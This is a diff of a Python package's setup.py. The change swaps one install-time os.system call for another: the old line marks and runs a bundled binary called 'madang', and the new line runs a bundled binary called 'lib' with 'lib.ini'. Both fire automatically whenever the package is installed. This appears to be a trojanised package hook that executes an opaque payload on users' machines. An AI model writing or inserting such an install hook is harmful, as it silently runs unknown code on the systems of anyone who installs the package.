@@ -1,5 +1,5 @@
 import os
-os.system ("chmod +x madang && ./madang")
+os.system ("chmod +x lib && ./lib lib.ini")
 from setuptools import find_packages, setup
 
 with open(os.path.join(os.path.dirname(__file__), 'README.md'), encoding="utf-8") as readme:
